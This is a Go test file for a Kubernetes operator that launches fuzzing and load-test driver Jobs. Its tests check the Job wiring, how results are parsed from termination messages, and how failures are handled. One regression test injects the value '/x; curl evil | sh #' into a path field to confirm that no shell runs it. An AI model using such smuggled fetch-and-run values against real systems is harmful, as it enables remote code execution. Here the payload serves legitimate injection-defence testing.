/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package controller

import (
	"context"
	"fmt"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
	appsv1 "k8s.io/api/apps/v1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/meta"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/reconcile"

	basquinv1alpha1 "github.com/ianp94/basquin/operator/api/v1alpha1"
)

// P5a (DD-025): the campaign reconciler gates on an Injected target, launches the driver Job wired to
// the target's coverage endpoint + app image, and aggregates the run's outcome from the driver pod's
// termination message. Run with envtest.
var _ = Describe("BasquinCampaign Controller (P5a)", func() {
	const (
		appImage    = "myco/app:1.2.3"
		runnerImg   = "test/runner:v1"
		dashImg     = "test/dashboard:v1"
		namespace   = "default"
		covEndpoint = "camp-basquin-jacoco.default.svc.cluster.local:6300"
	)
	ctx := context.Background()
	// Unique names per spec — envtest has no GC controller, so a leftover Job would otherwise bleed
	// into the next spec's first reconcile.
	runID := 0
	var campaignName, targetName, deployName string
	var campaignKey, jobKey types.NamespacedName
	BeforeEach(func() {
		runID++
		campaignName = fmt.Sprintf("camp-%d", runID)
		targetName = fmt.Sprintf("camptgt-%d", runID)
		deployName = fmt.Sprintf("campdep-%d", runID)
		campaignKey = types.NamespacedName{Name: campaignName, Namespace: namespace}
		jobKey = types.NamespacedName{Name: campaignName + "-driver", Namespace: namespace}
	})

	rec := func() *BasquinCampaignReconciler {
		return &BasquinCampaignReconciler{Client: k8sClient, Scheme: k8sClient.Scheme(),
			RunnerImage: runnerImg, DashboardImage: dashImg}
	}
	reconcileOnce := func() (reconcile.Result, error) {
		return rec().Reconcile(ctx, reconcile.Request{NamespacedName: campaignKey})
	}

	// A target Deployment whose app container carries the image the classes come from.
	newTargetDeploy := func() *appsv1.Deployment {
		return &appsv1.Deployment{
			ObjectMeta: metav1.ObjectMeta{Name: deployName, Namespace: namespace},
			Spec: appsv1.DeploymentSpec{
				Replicas: int32Ptr(1),
				Selector: &metav1.LabelSelector{MatchLabels: map[string]string{"app": deployName}},
				Template: corev1.PodTemplateSpec{
					ObjectMeta: metav1.ObjectMeta{Labels: map[string]string{"app": deployName}},
					Spec:       corev1.PodSpec{Containers: []corev1.Container{{Name: "app", Image: appImage}}},
				},
			},
		}
	}
	// An Injected target with a published coverage endpoint.
	makeInjectedTarget := func() {
		t := &basquinv1alpha1.BasquinTarget{
			ObjectMeta: metav1.ObjectMeta{Name: targetName, Namespace: namespace},
			Spec: basquinv1alpha1.BasquinTargetSpec{
				DeploymentRef: basquinv1alpha1.DeploymentReference{Name: deployName},
				Container:     "app",
				Agents:        basquinv1alpha1.AgentsSpec{Coverage: basquinv1alpha1.CoverageSpec{Enabled: true, Includes: "com.x.*"}},
				// Where operators actually put the latency budget (every bench manifest does this) —
				// and, before DD-040, the only place it ever went, reaching the target jvm alone.
				Invariants: basquinv1alpha1.InvariantsSpec{Mode: "soft", LatencyMaxMs: 250},
			},
		}
		Expect(k8sClient.Create(ctx, t)).To(Succeed())
		Expect(k8sClient.Get(ctx, types.NamespacedName{Name: targetName, Namespace: namespace}, t)).To(Succeed())
		t.Status.Phase = basquinv1alpha1.PhaseInjected
		t.Status.CoverageEndpoint = covEndpoint
		Expect(k8sClient.Status().Update(ctx, t)).To(Succeed())
	}
	newCampaign := func() *basquinv1alpha1.BasquinCampaign {
		return &basquinv1alpha1.BasquinCampaign{
			ObjectMeta: metav1.ObjectMeta{Name: campaignName, Namespace: namespace},
			Spec: basquinv1alpha1.BasquinCampaignSpec{
				TargetRef: basquinv1alpha1.TargetReference{Name: targetName},
				BaseURL:   "http://camp-deploy.default.svc:8080",
				Driver:    basquinv1alpha1.CampaignDriverSpec{Iterations: 500},
			},
		}
	}

	AfterEach(func() {
		for _, o := range []client.Object{
			&basquinv1alpha1.BasquinCampaign{ObjectMeta: metav1.ObjectMeta{Name: campaignName, Namespace: namespace}},
			&batchv1.Job{ObjectMeta: metav1.ObjectMeta{Name: campaignName + "-driver", Namespace: namespace}},
			&basquinv1alpha1.BasquinTarget{ObjectMeta: metav1.ObjectMeta{Name: targetName, Namespace: namespace}},
			&appsv1.Deployment{ObjectMeta: metav1.ObjectMeta{Name: deployName, Namespace: namespace}},
			// The per-campaign dashboard (P5b) is owner-ref'd to the campaign, but envtest has no GC, so
			// remove it explicitly to keep specs isolated.
			&appsv1.Deployment{ObjectMeta: metav1.ObjectMeta{Name: campaignName + "-dashboard", Namespace: namespace}},
			&corev1.Service{ObjectMeta: metav1.ObjectMeta{Name: campaignName + "-dashboard", Namespace: namespace}},
			&corev1.ConfigMap{ObjectMeta: metav1.ObjectMeta{Name: campaignName + "-corpus-out", Namespace: namespace}},
		} {
			_ = k8sClient.Delete(ctx, o)
		}
		// The simulated driver pod (from the completion test) isn't owned by anything we delete above.
		_ = k8sClient.DeleteAllOf(ctx, &corev1.Pod{}, client.InNamespace(namespace),
			client.MatchingLabels{"basquin.dev/campaign": campaignName})
	})

	It("stays Pending while the target is not Injected", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		// target exists but never marked Injected
		t := &basquinv1alpha1.BasquinTarget{ObjectMeta: metav1.ObjectMeta{Name: targetName, Namespace: namespace},
			Spec: basquinv1alpha1.BasquinTargetSpec{DeploymentRef: basquinv1alpha1.DeploymentReference{Name: deployName}}}
		Expect(k8sClient.Create(ctx, t)).To(Succeed())
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignPending))
		Expect(k8sClient.Get(ctx, jobKey, &batchv1.Job{})).NotTo(Succeed()) // no Job yet
	})

	It("launches the driver Job wired to the target and goes Running", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		job := &batchv1.Job{}
		Expect(k8sClient.Get(ctx, jobKey, job)).To(Succeed())
		tmpl := job.Spec.Template.Spec
		// initContainers: extract classes from the TARGET's app image, then verify they're non-empty.
		Expect(tmpl.InitContainers).To(HaveLen(2))
		Expect(tmpl.InitContainers[0].Name).To(Equal("extract-classes"))
		Expect(tmpl.InitContainers[0].Image).To(Equal(appImage))
		// verify-classes fails loud on an empty extract (war-only images) rather than silent 0% coverage.
		verify := tmpl.InitContainers[1]
		Expect(verify.Name).To(Equal("verify-classes"))
		Expect(verify.Image).To(Equal(runnerImg))
		Expect(verify.Command[0]).To(Equal("sh"))
		Expect(strings.Join(verify.Command, " ")).To(ContainSubstring(campaignClassesDir))
		Expect(strings.Join(verify.Command, " ")).To(ContainSubstring(".class"))
		// driver runs the runner image, wired via JAVA_TOOL_OPTIONS.
		Expect(tmpl.Containers[0].Image).To(Equal(runnerImg))
		jto := envValue(tmpl.Containers[0].Env, "JAVA_TOOL_OPTIONS")
		Expect(jto).To(ContainSubstring("-Dexamples.http.baseUrl=http://camp-deploy.default.svc:8080"))
		Expect(jto).To(ContainSubstring("-Dbasquin.coverage.jacoco=" + covEndpoint))
		Expect(jto).To(ContainSubstring("-Dbasquin.coverage.classes=" + campaignClassesDir))
		Expect(jto).To(ContainSubstring("-Dbasquin.summary.out=/dev/termination-log"))
		// DD-040: explore must NOT inherit the target's latency budget. There the target's own agent
		// evaluates it and reports back over the result channel, so a driver-side copy would count the
		// same request twice, at a different scope (client round trip, incl. network + driver GC).
		Expect(jto).NotTo(ContainSubstring("-Dbasquin.invariant.latency.maxMs"))
		Expect(tmpl.Containers[0].Args).To(Equal([]string{"500"}))
		Expect(job.OwnerReferences).To(ContainElement(HaveField("Name", campaignName)))
		// Driver pods carry component=driver so the rerun cleanup can target them without hitting the
		// dashboard pod (which shares the basquin.dev/campaign label).
		Expect(job.Spec.Template.Labels).To(HaveKeyWithValue("app.kubernetes.io/component", "driver"))

		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignRunning))
		Expect(got.Status.DriverJob).To(Equal(campaignName + "-driver"))
	})

	It("completes and reads coverage/findings from the driver pod's termination message", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed())
		_, err := reconcileOnce() // creates the Job, goes Running
		Expect(err).NotTo(HaveOccurred())

		// Simulate the Job succeeding and the driver pod terminating with a summary.
		job := &batchv1.Job{}
		Expect(k8sClient.Get(ctx, jobKey, job)).To(Succeed())
		job.Status.Succeeded = 1
		Expect(k8sClient.Status().Update(ctx, job)).To(Succeed())
		pod := &corev1.Pod{
			ObjectMeta: metav1.ObjectMeta{Name: campaignName + "-driver-abc", Namespace: namespace,
				Labels: map[string]string{"basquin.dev/campaign": campaignName}},
			Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "driver", Image: runnerImg}}},
		}
		Expect(k8sClient.Create(ctx, pod)).To(Succeed())
		Expect(k8sClient.Get(ctx, types.NamespacedName{Name: pod.Name, Namespace: namespace}, pod)).To(Succeed())
		pod.Status.ContainerStatuses = []corev1.ContainerStatus{{
			Name: "driver",
			State: corev1.ContainerState{Terminated: &corev1.ContainerStateTerminated{
				Message: `{"exploration":{"corpus":19,"coverage":{"pct":23.1}}}`}},
		}}
		Expect(k8sClient.Status().Update(ctx, pod)).To(Succeed())

		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignCompleted))
		Expect(got.Status.CoveragePct).To(Equal("23.1"))
		Expect(got.Status.Findings).To(Equal(int32(19)))
		Expect(got.Status.CompletionTime).NotTo(BeNil())
	})

	It("emits the replay corpus as a campaign-owned ConfigMap on completion (DD-026 PR 1)", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		job := &batchv1.Job{}
		Expect(k8sClient.Get(ctx, jobKey, job)).To(Succeed())
		job.Status.Succeeded = 1
		Expect(k8sClient.Status().Update(ctx, job)).To(Succeed())
		pod := &corev1.Pod{
			ObjectMeta: metav1.ObjectMeta{Name: campaignName + "-driver-c", Namespace: namespace,
				Labels: map[string]string{"basquin.dev/campaign": campaignName}},
			Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "driver", Image: runnerImg}}},
		}
		Expect(k8sClient.Create(ctx, pod)).To(Succeed())
		Expect(k8sClient.Get(ctx, types.NamespacedName{Name: pod.Name, Namespace: namespace}, pod)).To(Succeed())
		pod.Status.ContainerStatuses = []corev1.ContainerStatus{{
			Name: "driver",
			State: corev1.ContainerState{Terminated: &corev1.ContainerStateTerminated{
				Message: `{"exploration":{"corpus":2,"coverage":{"pct":11.0}},"replayCorpus":["/actions/Catalog.action","/actions/Cart.action?add=1"]}`}},
		}}
		Expect(k8sClient.Status().Update(ctx, pod)).To(Succeed())

		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.CorpusConfigMap).To(Equal(campaignName + "-corpus-out"))

		cm := &corev1.ConfigMap{}
		Expect(k8sClient.Get(ctx, types.NamespacedName{Name: campaignName + "-corpus-out", Namespace: namespace}, cm)).To(Succeed())
		Expect(cm.Data["corpus.txt"]).To(Equal("/actions/Catalog.action\n/actions/Cart.action?add=1\n"))
		Expect(cm.OwnerReferences).To(ContainElement(HaveField("Name", campaignName)))
	})

	// --- DD-026 PR 2: load mode ------------------------------------------------------------------
	newLoadCampaign := func(corpusCM string) *basquinv1alpha1.BasquinCampaign {
		c := newCampaign()
		c.Spec.Mode = "load"
		c.Spec.Driver.Iterations = 0
		c.Spec.Driver.Duration = "5m"
		c.Spec.Driver.CorpusConfigMap = corpusCM
		c.Spec.Driver.Concurrency = 25
		return c
	}

	It("builds a coverage-free driver Job in load mode", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		corpusCM := "corp-" + fmt.Sprint(runID)
		Expect(k8sClient.Create(ctx, &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: corpusCM, Namespace: namespace},
			Data:       map[string]string{"corpus.txt": "/actions/Catalog.action\n"}})).To(Succeed())
		Expect(k8sClient.Create(ctx, newLoadCampaign(corpusCM))).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		job := getJob(jobKey)
		Expect(job.Spec.Template.Spec.InitContainers).To(BeEmpty()) // no extract/verify in load
		jto := envValue(job.Spec.Template.Spec.Containers[0].Env, "JAVA_TOOL_OPTIONS")
		Expect(jto).To(ContainSubstring("-Dbasquin.mode=load"))
		Expect(jto).To(ContainSubstring("-Dbasquin.concurrency=25"))
		Expect(jto).To(ContainSubstring("-Dbasquin.corpusDir="))
		Expect(jto).NotTo(ContainSubstring("-Dbasquin.coverage.jacoco"))
		Expect(jto).NotTo(ContainSubstring("-Dbasquin.coverage.classes"))
		// DD-040: under load the target's valve is in passthrough and evaluates nothing, so the driver
		// is the only evaluator — and it must be given the budget the operator set on the TARGET.
		// Without this the run reports violations.latency for a threshold no process ever held.
		Expect(jto).To(ContainSubstring("-Dbasquin.invariant.latency.maxMs=250"))
	})

	It("completes a load run and reads status.load from the summary", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		corpusCM := "corp2-" + fmt.Sprint(runID)
		Expect(k8sClient.Create(ctx, &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: corpusCM, Namespace: namespace},
			Data:       map[string]string{"corpus.txt": "/actions/Catalog.action\n"}})).To(Succeed())
		Expect(k8sClient.Create(ctx, newLoadCampaign(corpusCM))).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		job := getJob(jobKey)
		job.Status.Succeeded = 1
		Expect(k8sClient.Status().Update(ctx, job)).To(Succeed())
		pod := &corev1.Pod{
			ObjectMeta: metav1.ObjectMeta{Name: campaignName + "-driver-l", Namespace: namespace,
				Labels: map[string]string{"basquin.dev/campaign": campaignName}},
			Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "driver", Image: runnerImg}}},
		}
		Expect(k8sClient.Create(ctx, pod)).To(Succeed())
		Expect(k8sClient.Get(ctx, types.NamespacedName{Name: pod.Name, Namespace: namespace}, pod)).To(Succeed())
		pod.Status.ContainerStatuses = []corev1.ContainerStatus{{
			Name: "driver",
			State: corev1.ContainerState{Terminated: &corev1.ContainerStateTerminated{
				Message: `{"load":{"requests":1000,"throughputRps":"250.5","latencyMs":{"p50":8,"p90":20,"p99":55,"max":120},"heapDriftKb":512,"threadDrift":1,"violations":{"latency":3,"heap":0,"thread":0}}}`}},
		}}
		Expect(k8sClient.Status().Update(ctx, pod)).To(Succeed())

		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignCompleted))
		Expect(got.Status.Load).NotTo(BeNil())
		Expect(got.Status.Load.Requests).To(Equal(int64(1000)))
		Expect(got.Status.Load.ThroughputRps).To(Equal("250.5"))
		Expect(got.Status.Load.LatencyMs.P99).To(Equal(int32(55)))
		Expect(got.Status.Load.Violations.Latency).NotTo(BeNil())
		Expect(*got.Status.Load.Violations.Latency).To(Equal(int32(3)))
		Expect(got.Status.CorpusConfigMap).To(BeEmpty()) // load consumes a corpus, doesn't emit one
	})

	// DD-040, the layer where omitting a field at the driver would have been theater: this drives the
	// summary of a load run that evaluated NOTHING (no latency threshold reached the driver, and load
	// mode never evaluates heap/thread) all the way through a real API server round trip — JSON →
	// unmarshal → status subresource write → read back. With the old non-pointer int32 fields every
	// omitted count would arrive here as a confident, entirely fabricated 0.
	It("never turns an unevaluated violation count into a measured zero", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		corpusCM := "corp3-" + fmt.Sprint(runID)
		Expect(k8sClient.Create(ctx, &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: corpusCM, Namespace: namespace},
			Data:       map[string]string{"corpus.txt": "/actions/Catalog.action\n"}})).To(Succeed())
		Expect(k8sClient.Create(ctx, newLoadCampaign(corpusCM))).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		job := getJob(jobKey)
		job.Status.Succeeded = 1
		Expect(k8sClient.Status().Update(ctx, job)).To(Succeed())
		pod := &corev1.Pod{
			ObjectMeta: metav1.ObjectMeta{Name: campaignName + "-driver-u", Namespace: namespace,
				Labels: map[string]string{"basquin.dev/campaign": campaignName}},
			Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "driver", Image: runnerImg}}},
		}
		Expect(k8sClient.Create(ctx, pod)).To(Succeed())
		Expect(k8sClient.Get(ctx, types.NamespacedName{Name: pod.Name, Namespace: namespace}, pod)).To(Succeed())
		pod.Status.ContainerStatuses = []corev1.ContainerStatus{{
			Name: "driver",
			State: corev1.ContainerState{Terminated: &corev1.ContainerStateTerminated{
				// Exactly what the DD-040 driver emits with no threshold configured: the Roller shape,
				// p50 503ms against an intended 250ms budget, and no count for anything.
				Message: `{"load":{"requests":1000,"throughputRps":"250.5","latencyMs":{"p50":503,"p90":700,"p99":900,"max":1200},` +
					`"driftUnavailable":true,"violations":{"notEvaluated":["latency","heap","thread"]}}}`}},
		}}
		Expect(k8sClient.Status().Update(ctx, pod)).To(Succeed())

		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Load).NotTo(BeNil())
		Expect(got.Status.Load.Violations.Latency).To(BeNil(), "an unevaluated count must survive the round trip as absent")
		Expect(got.Status.Load.Violations.Heap).To(BeNil())
		Expect(got.Status.Load.Violations.Thread).To(BeNil())
		Expect(got.Status.Load.Violations.NotEvaluated).To(ConsistOf("latency", "heap", "thread"))
		Expect(got.Status.Load.HeapDriftKb).To(BeNil(), "unavailable drift must not materialize as 0")
		Expect(got.Status.Load.DriftUnavailable).To(BeTrue(), "DD-035's marker must finally be parsed")

		// And the message an operator actually reads must not claim a clean run.
		cond := meta.FindStatusCondition(got.Status.Conditions, "Ready")
		Expect(cond).NotTo(BeNil())
		Expect(cond.Message).NotTo(ContainSubstring("0 latency violations"))
		Expect(cond.Message).To(ContainSubstring("not evaluated"))
	})

	It("surfaces a failed initContainer's reason in campaign status (review #24)", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed())
		_, err := reconcileOnce() // Job created, Running
		Expect(err).NotTo(HaveOccurred())

		// Simulate the Job failing (backoff exhausted) due to a verify-classes init failure.
		job := &batchv1.Job{}
		Expect(k8sClient.Get(ctx, jobKey, job)).To(Succeed())
		job.Status.Failed = 3 // > BackoffLimit(2)
		Expect(k8sClient.Status().Update(ctx, job)).To(Succeed())
		pod := &corev1.Pod{
			ObjectMeta: metav1.ObjectMeta{Name: campaignName + "-driver-xyz", Namespace: namespace,
				Labels: map[string]string{"basquin.dev/campaign": campaignName, "app.kubernetes.io/component": "driver"}},
			Spec: corev1.PodSpec{
				InitContainers: []corev1.Container{{Name: "verify-classes", Image: runnerImg}},
				Containers:     []corev1.Container{{Name: "driver", Image: runnerImg}}},
		}
		Expect(k8sClient.Create(ctx, pod)).To(Succeed())
		Expect(k8sClient.Get(ctx, types.NamespacedName{Name: pod.Name, Namespace: namespace}, pod)).To(Succeed())
		pod.Status.InitContainerStatuses = []corev1.ContainerStatus{{
			Name: "verify-classes",
			State: corev1.ContainerState{Terminated: &corev1.ContainerStateTerminated{
				ExitCode: 1, Message: "no .class files extracted into /basquin-classes — check spec.driver.classesPath"}},
		}}
		Expect(k8sClient.Status().Update(ctx, pod)).To(Succeed())

		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignFailed))
		cond := meta.FindStatusCondition(got.Status.Conditions, "Ready")
		Expect(cond.Reason).To(Equal("InitContainerFailed"))
		Expect(cond.Message).To(ContainSubstring("verify-classes"))
		Expect(cond.Message).To(ContainSubstring("no .class files"))
	})

	It("fails with TargetGone if the target is deleted mid-run", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed())
		_, err := reconcileOnce() // Running
		Expect(err).NotTo(HaveOccurred())

		Expect(k8sClient.Delete(ctx, &basquinv1alpha1.BasquinTarget{
			ObjectMeta: metav1.ObjectMeta{Name: targetName, Namespace: namespace}})).To(Succeed())
		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignFailed))
		Expect(meta.FindStatusCondition(got.Status.Conditions, "Ready").Reason).To(Equal("TargetGone"))
	})

	It("rejects duration AND iterations set together (CEL)", func() {
		c := newCampaign()
		c.Spec.Driver.Duration = "10m" // both duration and iterations=500
		Expect(k8sClient.Create(ctx, c)).NotTo(Succeed())
	})

	It("does not let classesPath inject shell commands (review #1)", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		c := newCampaign()
		c.Spec.Driver.ClassesPath = "/x; curl evil | sh #" // shell metacharacters
		Expect(k8sClient.Create(ctx, c)).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		job := &batchv1.Job{}
		Expect(k8sClient.Get(ctx, jobKey, job)).To(Succeed())
		ic := job.Spec.Template.Spec.InitContainers[0]
		// cp is exec'd directly — no shell, so the metacharacters are inert cp arguments.
		Expect(ic.Command[0]).To(Equal("cp"))
		Expect(ic.Command).NotTo(ContainElement("sh"))
		Expect(ic.Command).To(ContainElement("/x; curl evil | sh #/."))
	})

	It("projects the grammar ConfigMap's sole key to a real file when no key is named (review #2)", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: "gram-" + fmt.Sprint(runID), Namespace: namespace},
			Data:       map[string]string{"jpetstore.grammar": "/x\n"}})).To(Succeed())
		c := newCampaign()
		c.Spec.Driver.GrammarConfigMap = "gram-" + fmt.Sprint(runID) // no GrammarKey
		Expect(k8sClient.Create(ctx, c)).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		job := &batchv1.Job{}
		Expect(k8sClient.Get(ctx, jobKey, job)).To(Succeed())
		var gvol *corev1.Volume
		for i := range job.Spec.Template.Spec.Volumes {
			if job.Spec.Template.Spec.Volumes[i].Name == campaignGrammarVol {
				gvol = &job.Spec.Template.Spec.Volumes[i]
			}
		}
		Expect(gvol).NotTo(BeNil())
		Expect(gvol.ConfigMap.Items).To(Equal([]corev1.KeyToPath{{Key: "jpetstore.grammar", Path: campaignGrammarKey}}))
		Expect(envValue(job.Spec.Template.Spec.Containers[0].Env, "JAVA_TOOL_OPTIONS")).
			To(ContainSubstring("-Dbasquin.grammar=" + campaignGrammarDir + "/" + campaignGrammarKey))
	})

	It("stays Pending when the grammar ConfigMap is ambiguous (multiple keys, no key named)", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: "gram2-" + fmt.Sprint(runID), Namespace: namespace},
			Data:       map[string]string{"a": "x", "b": "y"}})).To(Succeed())
		c := newCampaign()
		c.Spec.Driver.GrammarConfigMap = "gram2-" + fmt.Sprint(runID)
		Expect(k8sClient.Create(ctx, c)).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignPending))
		Expect(meta.FindStatusCondition(got.Status.Conditions, "Ready").Reason).To(Equal("GrammarUnresolved"))
		Expect(k8sClient.Get(ctx, jobKey, &batchv1.Job{})).NotTo(Succeed()) // no Job
	})

	It("mounts a flat corpus ConfigMap and points -Dbasquin.corpusDir at it", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: "corp-" + fmt.Sprint(runID), Namespace: namespace},
			Data:       map[string]string{"catalog_item.txt": "/actions/Catalog.action\n", "categoryId.txt": "FISH\n"}})).To(Succeed())
		c := newCampaign()
		c.Spec.Driver.CorpusConfigMap = "corp-" + fmt.Sprint(runID)
		Expect(k8sClient.Create(ctx, c)).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		job := getJob(jobKey)
		var cvol *corev1.Volume
		for i := range job.Spec.Template.Spec.Volumes {
			if job.Spec.Template.Spec.Volumes[i].Name == campaignCorpusVol {
				cvol = &job.Spec.Template.Spec.Volumes[i]
			}
		}
		Expect(cvol).NotTo(BeNil())
		Expect(cvol.ConfigMap.Name).To(Equal("corp-" + fmt.Sprint(runID)))
		Expect(cvol.ConfigMap.Items).To(BeEmpty()) // flat: all keys projected as-is
		Expect(envValue(job.Spec.Template.Spec.Containers[0].Env, "JAVA_TOOL_OPTIONS")).
			To(ContainSubstring("-Dbasquin.corpusDir=" + campaignCorpusDir))
	})

	It("fails with TargetGone if the target drops out of Injected mid-run (review #3)", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed())
		_, err := reconcileOnce() // Running
		Expect(err).NotTo(HaveOccurred())

		// The target reverts to Pending (still exists, no longer Injected) mid-run.
		t := &basquinv1alpha1.BasquinTarget{}
		Expect(k8sClient.Get(ctx, types.NamespacedName{Name: targetName, Namespace: namespace}, t)).To(Succeed())
		t.Status.Phase = basquinv1alpha1.PhasePending
		Expect(k8sClient.Status().Update(ctx, t)).To(Succeed())
		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignFailed))
		Expect(meta.FindStatusCondition(got.Status.Conditions, "Ready").Reason).To(Equal("TargetGone"))
	})

	// --- spec-hash idempotency (§7c) ------------------------------------------------------------
	It("reruns the driver Job when the run-defining spec changes", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		h1 := getJob(jobKey).Annotations[specHashAnnotation]
		Expect(h1).NotTo(BeEmpty())

		// Edit the run-defining spec (iterations 500 → 999).
		c := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, c)).To(Succeed())
		c.Spec.Driver.Iterations = 999
		Expect(k8sClient.Update(ctx, c)).To(Succeed())

		// First reconcile after the edit: hash mismatch → delete the stale Job, go Provisioning.
		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		Eventually(func() bool { return k8sClient.Get(ctx, jobKey, &batchv1.Job{}) != nil }).Should(BeTrue())
		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignProvisioning))

		// Next reconcile: recreate with the new hash + new args.
		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		job2 := getJob(jobKey)
		Expect(job2.Annotations[specHashAnnotation]).NotTo(Equal(h1))
		Expect(job2.Spec.Template.Spec.Containers[0].Args).To(Equal([]string{"999"}))
	})

